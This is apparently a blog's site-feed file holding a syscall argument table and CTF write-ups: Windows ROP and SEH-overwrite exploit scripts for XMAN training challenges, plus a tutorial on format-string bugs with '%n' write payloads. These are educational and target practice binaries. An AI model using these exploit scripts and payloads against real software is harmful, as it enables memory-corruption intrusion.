<td>char *filename</td>
<td>struct timeval *utimes</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>236</td>
<td>sys_vserver</td>
<td>NOT IMPLEMENTED</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>237</td>
<td>sys_mbind</td>
<td>unsigned long start</td>
<td>unsigned long len</td>
<td>unsigned long mode</td>
<td>unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned flags</td>
</tr>
<tr>
<td>238</td>
<td>sys_set_mempolicy</td>
<td>int mode</td>
<td>unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>239</td>
<td>sys_get_mempolicy</td>
<td>int *policy</td>
<td>unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned long addr</td>
<td>unsigned long flags</td>
<td></td>
</tr>
<tr>
<td>240</td>
<td>sys_mq_open</td>
<td>const char *u_name</td>
<td>int oflag</td>
<td>mode_t mode</td>
<td>struct mq_attr *u_attr</td>
<td></td>
<td></td>
</tr>
<tr>
<td>241</td>
<td>sys_mq_unlink</td>
<td>const char *u_name</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>242</td>
<td>sys_mq_timedsend</td>
<td>mqd_t mqdes</td>
<td>const char *u_msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int msg_prio</td>
<td>const stuct timespec *u_abs_timeout</td>
<td></td>
</tr>
<tr>
<td>243</td>
<td>sys_mq_timedreceive</td>
<td>mqd_t mqdes</td>
<td>char *u_msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int *u_msg_prio</td>
<td>const struct timespec *u_abs_timeout</td>
<td></td>
</tr>
<tr>
<td>244</td>
<td>sys_mq_notify</td>
<td>mqd_t mqdes</td>
<td>const struct sigevent *u_notification</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>245</td>
<td>sys_mq_getsetattr</td>
<td>mqd_t mqdes</td>
<td>const struct mq_attr *u_mqstat</td>
<td>struct mq_attr *u_omqstat</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>246</td>
<td>sys_kexec_load</td>
<td>unsigned long entry</td>
<td>unsigned long nr_segments</td>
<td>struct kexec_segment *segments</td>
<td>unsigned long flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>247</td>
<td>sys_waitid</td>
<td>int which</td>
<td>pid_t upid</td>
<td>struct siginfo *infop</td>
<td>int options</td>
<td>struct rusage *ru</td>
<td></td>
</tr>
<tr>
<td>248</td>
<td>sys_add_key</td>
<td>const char *_type</td>
<td>const char *_description</td>
<td>const void *_payload</td>
<td>size_t plen</td>
<td></td>
<td></td>
</tr>
<tr>
<td>249</td>
<td>sys_request_key</td>
<td>const char *_type</td>
<td>const char *_description</td>
<td>const char *_callout_info</td>
<td>key_serial_t destringid</td>
<td></td>
<td></td>
</tr>
<tr>
<td>250</td>
<td>sys_keyctl</td>
<td>int option</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td></td>
</tr>
<tr>
<td>251</td>
<td>sys_ioprio_set</td>
<td>int which</td>
<td>int who</td>
<td>int ioprio</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>252</td>
<td>sys_ioprio_get</td>
<td>int which</td>
<td>int who</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>253</td>
<td>sys_inotify_init</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>254</td>
<td>sys_inotify_add_watch</td>
<td>int fd</td>
<td>const char *pathname</td>
<td>u32 mask</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>255</td>
<td>sys_inotify_rm_watch</td>
<td>int fd</td>
<td>__s32 wd</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>256</td>
<td>sys_migrate_pages</td>
<td>pid_t pid</td>
<td>unsigned long maxnode</td>
<td>const unsigned long *old_nodes</td>
<td>const unsigned long *new_nodes</td>
<td></td>
<td></td>
</tr>
<tr>
<td>257</td>
<td>sys_openat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int flags</td>
<td>int mode</td>
<td></td>
<td></td>
</tr>
<tr>
<td>258</td>
<td>sys_mkdirat</td>
<td>int dfd</td>
<td>const char *pathname</td>
<td>int mode</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>259</td>
<td>sys_mknodat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int mode</td>
<td>unsigned dev</td>
<td></td>
<td></td>
</tr>
<tr>
<td>260</td>
<td>sys_fchownat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>int flag</td>
<td></td>
</tr>
<tr>
<td>261</td>
<td>sys_futimesat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct timeval *utimes</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>262</td>
<td>sys_newfstatat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct stat *statbuf</td>
<td>int flag</td>
<td></td>
<td></td>
</tr>
<tr>
<td>263</td>
<td>sys_unlinkat</td>
<td>int dfd</td>
<td>const char *pathname</td>
<td>int flag</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>264</td>
<td>sys_renameat</td>
<td>int oldfd</td>
<td>const char *oldname</td>
<td>int newfd</td>
<td>const char *newname</td>
<td></td>
<td></td>
</tr>
<tr>
<td>265</td>
<td>sys_linkat</td>
<td>int oldfd</td>
<td>const char *oldname</td>
<td>int newfd</td>
<td>const char *newname</td>
<td>int flags</td>
<td></td>
</tr>
<tr>
<td>266</td>
<td>sys_symlinkat</td>
<td>const char *oldname</td>
<td>int newfd</td>
<td>const char *newname</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>267</td>
<td>sys_readlinkat</td>
<td>int dfd</td>
<td>const char *pathname</td>
<td>char *buf</td>
<td>int bufsiz</td>
<td></td>
<td></td>
</tr>
<tr>
<td>268</td>
<td>sys_fchmodat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>mode_t mode</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>269</td>
<td>sys_faccessat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int mode</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>270</td>
<td>sys_pselect6</td>
<td>int n</td>
<td>fd_set *inp</td>
<td>fd_set *outp</td>
<td>fd_set *exp</td>
<td>struct timespec *tsp</td>
<td>void *sig</td>
</tr>
<tr>
<td>271</td>
<td>sys_ppoll</td>
<td>struct pollfd *ufds</td>
<td>unsigned int nfds</td>
<td>struct timespec *tsp</td>
<td>const sigset_t *sigmask</td>
<td>size_t sigsetsize</td>
<td></td>
</tr>
<tr>
<td>272</td>
<td>sys_unshare</td>
<td>unsigned long unshare_flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>273</td>
<td>sys_set_robust_list</td>
<td>struct robust_list_head *head</td>
<td>size_t len</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>274</td>
<td>sys_get_robust_list</td>
<td>int pid</td>
<td>struct robust_list_head **head_ptr</td>
<td>size_t *len_ptr</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>275</td>
<td>sys_splice</td>
<td>int fd_in</td>
<td>loff_t *off_in</td>
<td>int fd_out</td>
<td>loff_t *off_out</td>
<td>size_t len</td>
<td>unsigned int flags</td>
</tr>
<tr>
<td>276</td>
<td>sys_tee</td>
<td>int fdin</td>
<td>int fdout</td>
<td>size_t len</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>277</td>
<td>sys_sync_file_range</td>
<td>long fd</td>
<td>loff_t offset</td>
<td>loff_t bytes</td>
<td>long flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>278</td>
<td>sys_vmsplice</td>
<td>int fd</td>
<td>const struct iovec *iov</td>
<td>unsigned long nr_segs</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>279</td>
<td>sys_move_pages</td>
<td>pid_t pid</td>
<td>unsigned long nr_pages</td>
<td>const void **pages</td>
<td>const int *nodes</td>
<td>int *status</td>
<td>int flags</td>
</tr>
<tr>
<td>280</td>
<td>sys_utimensat</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct timespec *utimes</td>
<td>int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>281</td>
<td>sys_epoll_pwait</td>
<td>int epfd</td>
<td>struct epoll_event *events</td>
<td>int maxevents</td>
<td>int timeout</td>
<td>const sigset_t *sigmask</td>
<td>size_t sigsetsize</td>
</tr>
<tr>
<td>282</td>
<td>sys_signalfd</td>
<td>int ufd</td>
<td>sigset_t *user_mask</td>
<td>size_t sizemask</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>283</td>
<td>sys_timerfd_create</td>
<td>int clockid</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>284</td>
<td>sys_eventfd</td>
<td>unsigned int count</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>285</td>
<td>sys_fallocate</td>
<td>long fd</td>
<td>long mode</td>
<td>loff_t offset</td>
<td>loff_t len</td>
<td></td>
<td></td>
</tr>
<tr>
<td>286</td>
<td>sys_timerfd_settime</td>
<td>int ufd</td>
<td>int flags</td>
<td>const struct itimerspec *utmr</td>
<td>struct itimerspec *otmr</td>
<td></td>
<td></td>
</tr>
<tr>
<td>287</td>
<td>sys_timerfd_gettime</td>
<td>int ufd</td>
<td>struct itimerspec *otmr</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>288</td>
<td>sys_accept4</td>
<td>int fd</td>
<td>struct sockaddr *upeer_sockaddr</td>
<td>int *upeer_addrlen</td>
<td>int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>289</td>
<td>sys_signalfd4</td>
<td>int ufd</td>
<td>sigset_t *user_mask</td>
<td>size_t sizemask</td>
<td>int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>290</td>
<td>sys_eventfd2</td>
<td>unsigned int count</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>291</td>
<td>sys_epoll_create1</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>292</td>
<td>sys_dup3</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>293</td>
<td>sys_pipe2</td>
<td>int *filedes</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>294</td>
<td>sys_inotify_init1</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>295</td>
<td>sys_preadv</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td></td>
</tr>
<tr>
<td>296</td>
<td>sys_pwritev</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td></td>
</tr>
<tr>
<td>297</td>
<td>sys_rt_tgsigqueueinfo</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t *uinfo</td>
<td></td>
<td></td>
</tr>
<tr>
<td>298</td>
<td>sys_perf_event_open</td>
<td>struct perf_event_attr *attr_uptr</td>
<td>pid_t pid</td>
<td>int cpu</td>
<td>int group_fd</td>
<td>unsigned long flags</td>
<td></td>
</tr>
<tr>
<td>299</td>
<td>sys_recvmmsg</td>
<td>int fd</td>
<td>struct msghdr *mmsg</td>
<td>unsigned int vlen</td>
<td>unsigned int flags</td>
<td>struct timespec *timeout</td>
<td></td>
</tr>
<tr>
<td>300</td>
<td>sys_fanotify_init</td>
<td>unsigned int flags</td>
<td>unsigned int event_f_flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>301</td>
<td>sys_fanotify_mark</td>
<td>long fanotify_fd</td>
<td>long flags</td>
<td>__u64 mask</td>
<td>long dfd</td>
<td>long pathname</td>
<td></td>
</tr>
<tr>
<td>302</td>
<td>sys_prlimit64</td>
<td>pid_t pid</td>
<td>unsigned int resource</td>
<td>const struct rlimit64 *new_rlim</td>
<td>struct rlimit64 *old_rlim</td>
<td></td>
<td></td>
</tr>
<tr>
<td>303</td>
<td>sys_name_to_handle_at</td>
<td>int dfd</td>
<td>const char *name</td>
<td>struct file_handle *handle</td>
<td>int *mnt_id</td>
<td>int flag</td>
<td></td>
</tr>
<tr>
<td>304</td>
<td>sys_open_by_handle_at</td>
<td>int dfd</td>
<td>const char *name</td>
<td>struct file_handle *handle</td>
<td>int *mnt_id</td>
<td>int flags</td>
<td></td>
</tr>
<tr>
<td>305</td>
<td>sys_clock_adjtime</td>
<td>clockid_t which_clock</td>
<td>struct timex *tx</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>306</td>
<td>sys_syncfs</td>
<td>int fd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>307</td>
<td>sys_sendmmsg</td>
<td>int fd</td>
<td>struct mmsghdr *mmsg</td>
<td>unsigned int vlen</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>308</td>
<td>sys_setns</td>
<td>int fd</td>
<td>int nstype</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>309</td>
<td>sys_getcpu</td>
<td>unsigned *cpup</td>
<td>unsigned *nodep</td>
<td>struct getcpu_cache *unused</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>310</td>
<td>sys_process_vm_readv</td>
<td>pid_t pid</td>
<td>const struct iovec *lvec</td>
<td>unsigned long liovcnt</td>
<td>const struct iovec *rvec</td>
<td>unsigned long riovcnt</td>
<td>unsigned long flags</td>
</tr>
<tr>
<td>311</td>
<td>sys_process_vm_writev</td>
<td>pid_t pid</td>
<td>const struct iovec *lvec</td>
<td>unsigned long liovcnt</td>
<td>const struct iovcc *rvec</td>
<td>unsigned long riovcnt</td>
<td>unsigned long flags</td>
</tr>
<tr>
<td>312</td>
<td>sys_kcmp</td>
<td>pid_t pid1</td>
<td>pid_t pid2</td>
<td>int type</td>
<td>unsigned long idx1</td>
<td>unsigned long idx2</td>
<td></td>
</tr>
<tr>
<td>313</td>
<td>sys_finit_module</td>
<td>int fd</td>
<td>const char __user *uargs</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>314</td>
<td>sys_sched_setattr</td>
<td>pid_t pid</td>
<td>struct sched_attr __user *attr</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>315</td>
<td>sys_sched_getattr</td>
<td>pid_t pid</td>
<td>struct sched_attr __user *attr</td>
<td>unsigned int size</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
</tr>
<tr>
<td>316</td>
<td>sys_renameat2</td>
<td>int olddfd</td>
<td>const char __user *oldname</td>
<td>int newdfd</td>
<td>const char __user *newname</td>
<td>unsigned int flags</td>
<td></td>
</tr>
<tr>
<td>317</td>
<td>sys_seccomp</td>
<td>unsigned int op</td>
<td>unsigned int flags</td>
<td>const char __user *uargs</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>318</td>
<td>sys_getrandom</td>
<td>char __user *buf</td>
<td>size_t count</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>319</td>
<td>sys_memfd_create</td>
<td>const char __user *uname_ptr</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>320</td>
<td>sys_kexec_file_load</td>
<td>int kernel_fd</td>
<td>int initrd_fd</td>
<td>unsigned long cmdline_len</td>
<td>const char __user *cmdline_ptr</td>
<td>unsigned long flags</td>
<td></td>
</tr>
<tr>
<td>321</td>
<td>sys_bpf</td>
<td>int cmd</td>
<td>union bpf_attr *attr</td>
<td>unsigned int size</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>322</td>
<td>stub_execveat</td>
<td>int dfd</td>
<td>const char __user *filename</td>
<td>const char <strong>user *const </strong>user *argv</td>
<td>const char <strong>user *const </strong>user *envp</td>
<td>int flags</td>
<td></td>
</tr>
<tr>
<td>323</td>
<td>userfaultfd</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>324</td>
<td>membarrier</td>
<td>int cmd</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>325</td>
<td>mlock2</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>326</td>
<td>copy_file_range</td>
<td>int fd_in</td>
<td>loff_t __user *off_in</td>
<td>int fd_out</td>
<td>loff_t __user * off_out</td>
<td>size_t len</td>
<td>unsigned int flags</td>
</tr>
<tr>
<td>327</td>
<td>preadv2</td>
<td>unsigned long fd</td>
<td>const struct iovec __user *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>int flags</td>
</tr>
<tr>
<td>328</td>
<td>pwritev2</td>
<td>unsigned long fd</td>
<td>const struct iovec __user *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>int flags</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> re </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN之旅-windows exploit technique]]></title>
      <url>/2017/08/05/XMAN%E4%B9%8B%E6%97%85-windows-exploit-technique/</url>
      <content type="html"><![CDATA[<h3 id="1-babyrop"><a href="#1-babyrop" class="headerlink" title="1. babyrop"></a>1. babyrop</h3><blockquote>
<p>leak MSVCR100 address =&gt; get system address =&gt; get address of &quot;cmd.exe&quot; =&gt; overwrite return address with system address</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./babyrop.exe"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"name"</span>)</div><div class="line">p.sendline(<span class="string">"A"</span>*<span class="number">24</span>)</div><div class="line">p.recvuntil(<span class="string">"A"</span>*<span class="number">24</span>)</div><div class="line">crt = p.recv(<span class="number">4</span>)</div><div class="line"></div><div class="line">msvcr_base = u32(crt) - <span class="number">0x1d1af</span></div><div class="line">system_address = msvcr_base + <span class="number">0x62632</span></div><div class="line">cmd_address = msvcr_base + <span class="number">0x43030</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0xCC</span>+<span class="string">"AAAA"</span>+p32(system_address)+p32(<span class="number">0xdeadbeaf</span>)+p32(cmd_address)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"input your message length"</span>)</div><div class="line">p.sendline(str(len(payload)))</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>padding + system_address + 4 bytes padding + cmd_address</p>
</blockquote>
<h3 id="2-babyrop2"><a href="#2-babyrop2" class="headerlink" title="2. babyrop2"></a>2. babyrop2</h3><blockquote>
<p>leak babyrop2 address and stack address =&gt; get system(&quot;cmd.exe&quot;) address and seh address =&gt; get first seh handler offset</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./babyrop2.exe"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"input your name"</span>)</div><div class="line">p.send(<span class="string">"A"</span>*<span class="number">68</span>+<span class="string">"\x0a"</span>)</div><div class="line">p.recvuntil(<span class="string">"A"</span>*<span class="number">68</span>)</div><div class="line">crt = p.recv(<span class="number">8</span>)</div><div class="line"></div><div class="line">babyrop2_address = (u32(crt[<span class="number">0</span>:<span class="number">4</span>]) &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">16</span></div><div class="line">ebp_address = u32(crt[<span class="number">4</span>:<span class="number">8</span>]) + <span class="number">0x4</span></div><div class="line">system_cmd_address = babyrop2_address + <span class="number">0x1117</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> hex(babyrop2_address)</div><div class="line"><span class="keyword">print</span> hex(ebp_address)</div><div class="line"></div><div class="line">message_address = ebp_address - <span class="number">0xCC</span></div><div class="line">first_seh_address = ebp_address + <span class="number">0x38</span></div><div class="line">offset = first_seh_address - message_address</div><div class="line">next_seh_address = ebp_address + <span class="number">0x94</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*offset + p32(next_seh_address) + p32(system_cmd_address)+<span class="string">"A"</span>*<span class="number">30000</span></div><div class="line">p.recvuntil(<span class="string">"input your message length"</span>)</div><div class="line">p.sendline(str(len(payload)))</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>代码说明：</p>
<ol>
<li><p>首先通过第一个printf函数leak出babyrop2地址、main函数中的ebp地址</p>
</li>
<li><p>然后通过ida获取message在main函数中偏移为[bp-CCh]，通过windbg获取first seh的地址与ebp之间的差值为0x38。于是结合起来就可以获得填充字符串数offset</p>
</li>
<li><p>通过windbg获取first ebp所指向的下一个seh地址 与 ebp之间的差值 0x94</p>
</li>
<li><p>为了让程序进入异常，我们在payload后加入很长的字符串</p>
</li>
</ol>
<p>payload:</p>
<blockquote>
<p>padding + next_seh_address + system_cmd_address + long string</p>
</blockquote>
<h3 id="3-babyvtable"><a href="#3-babyvtable" class="headerlink" title="3. babyvtable"></a>3. babyvtable</h3><p>了解一些基本的知识点</p>
<h4 id="3-1-windows-x64平台fastcall调用约定"><a href="#3-1-windows-x64平台fastcall调用约定" class="headerlink" title="3.1 windows x64平台fastcall调用约定"></a>3.1 windows x64平台fastcall调用约定</h4><ol>
<li><p>前四个整型或指针类型参数由RCX,RDX,R8,R9依次传递，前四个浮点类型参数由XMM0,XMM1,XMM2,XMM3依次传递。</p>
</li>
<li><p>调用函数为前四个参数在调用栈上保留相应的空间，称作shadow space或spill slot。即使被调用方没有或小于4个参数，调用函数仍然保留那么多的栈空间，这有助于在某些特殊情况下简化调用约定。</p>
</li>
<li><p>除前四个参数以外的任何其他参数通过栈来传递，从右至左依次入栈。</p>
</li>
<li><p>由调用函数负责清理调用栈。</p>
</li>
<li><p>小于等于64位的整型或指针类型返回值由RAX传递。</p>
</li>
<li><p>浮点返回值由XMM0传递。</p>
</li>
<li><p>更大的返回值(比如结构体)，由调用方在栈上分配空间，并有RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用3个寄存器，其余参数入栈。函数调用结束后，RAX返回该空间的指针。</p>
</li>
<li><p>除RCX,RDX,R8,R9以外，RAX、R10、R11、XMM4 和 XMM5也是易变化的(volatile)寄存器。</p>
</li>
<li><p>RBX, RBP, RDI, RSI, R12, R14, R14, and R15寄存器则必须在使用时进行保护。</p>
</li>
<li><p>在寄存器中，所有参数都是右对齐的。小于64位的参数并不进行高位零扩展，也就是高位是无法预测的垃圾数据。</p>
</li>
</ol>
<h4 id="3-2-C-虚表介绍"><a href="#3-2-C-虚表介绍" class="headerlink" title="3.2 C++虚表介绍"></a>3.2 C++虚表介绍</h4><ol>
<li><p>当类继承了父类（父类含有虚函数），或者类中本来就有虚函数，那么编译之后就会产生虚表。</p>
</li>
<li><p>若A、B继承了父类C，那么在rdata段中将会有连续的空间存放A继承C的虚函数指针、B继承C的虚函数指针</p>
</li>
<li><p>实例化A或B时，将会在栈空间，则地址的首部放置指向虚表的指针，紧接着是各个局部变量;若是new()创建，则是堆空间，这时局部变量放置到栈空间，malloc的变量放置到堆空间。</p>
</li>
</ol>
<h4 id="3-3-本题说明"><a href="#3-3-本题说明" class="headerlink" title="3.3 本题说明"></a>3.3 本题说明</h4><p>由于babyvtable使用了CFG、ASLR、DEP、GS、SafeSEHOP等完整的防护机制，看起来貌似无懈可击，但是CFG的堆地址随机分配，导致我们可以让结构体、结构体中某个变量malloc出的字符串 并不一定成前后分布。</p>
<p>兴许堆地址随机分配，可能造成结构体中某个变量malloc出的字符串在结构体的前面，从而堆溢出造成覆盖虚表指针等操作！</p>
<p><strong>CFG打开一般需要连续malloc同一区域16次，或不连续malloc同一区域0x40次！打开CFG，意味着malloc的堆地址随机化！</strong></p>
<p><strong>由于windows的ASLR是以页为单位，也即4k大小为单位，所以为了判断某个位置是否是结构体开始的虚表指针，只需要查找其在主程序中的位置偏移（33f0），由于页为4k，大小为1.5个字节，所以比较的时候是ord(msg[i])==0xf0 and (ord(msg[i+1])&amp;0x0f)==0x3</strong></p>
<p><strong>idata段中放置了一些程序用到的函数iat</strong></p>
]]></content>
      
        <categories>
            
            <category> xman </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> 调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[printf格式化漏洞]]></title>
      <url>/2017/08/04/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h3 id="1-格式化字符串漏洞基本原理"><a href="#1-格式化字符串漏洞基本原理" class="headerlink" title="1. 格式化字符串漏洞基本原理"></a>1. 格式化字符串漏洞基本原理</h3><p>格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是printf、sprintf、fprintf等print家族函数。介绍格式化字符串原理的文章有很多，我这里就以printf函数为例，简单回顾其中的要点。</p>
<blockquote>
<p>printf(&quot;format&quot;, arg1, arg2, ...)</p>
</blockquote>
<p>其第一个参数为格式化字符串，用来告诉程序以什么格式进行输出！然后是参数1（偏移1），参数2（偏移2），...</p>
<p>下面是两张详细的说明图：<br><img src="/images/2017-08-04/printf_stack.png" alt="printf_stack.png"></p>
<p><img src="/images/2017-08-04/printf_stack2.png" alt="printf_stack2.png"></p>
<h3 id="2-格式化漏洞测试"><a href="#2-格式化漏洞测试" class="headerlink" title="2. 格式化漏洞测试"></a>2. 格式化漏洞测试</h3><p>写出一下printf函数</p>
<blockquote>
<p>printf(&quot;%8$x1234&quot;);</p>
</blockquote>
<p>gdb调试该程序，最后展示栈内容，得到如下图：</p>
<p><img src="/images/2017-08-04/stack_value.jpg" alt="stack_value"></p>
<p>打印结果：</p>
<blockquote>
<p>12341234</p>
</blockquote>
<font color="#f00">说明：<br>A、8$ 表示栈空间从format string算起，偏移量为8的那个栈位置，在上图中format string对应的是地址0xffffd234，值为0x0804b438；而偏移为8的位置为0xffffd250，值为0x34333231(&quot;1234&quot;)，最终会输出的是偏移8地址上的值&quot;1234&quot;<br>B、如果将上面的format换成%8$s1234，那么就相当于打印0x34333231处的字符串。而如果此处为funA@got地址，那么输出的字符串就会是funA的执行地址<br>C、对于密码，输入“%2214x%8$hn”，其中，2214是0x8a6的10进制，而%8$hn表示将前面输出的字符数（即2214）写入偏移8处储存的栈地址所指向空间的低两字节处，即修改0x0d74为0x08a6；若用n，则%2214x需改为%4196518x，即需要输出4196518个字符，开销太大，特别是在远程攻击时，很可能导致连接断掉。<br></font>

<h3 id="3-基本的格式化字符串参数"><a href="#3-基本的格式化字符串参数" class="headerlink" title="3.基本的格式化字符串参数"></a>3.基本的格式化字符串参数</h3><ul>
<li>%c：输出字符，配上%n可用于向指定地址写数据。</li>
<li>%d：输出十进制整数，配上%n可用于向指定地址写数据。</li>
<li>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</li>
<li>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</li>
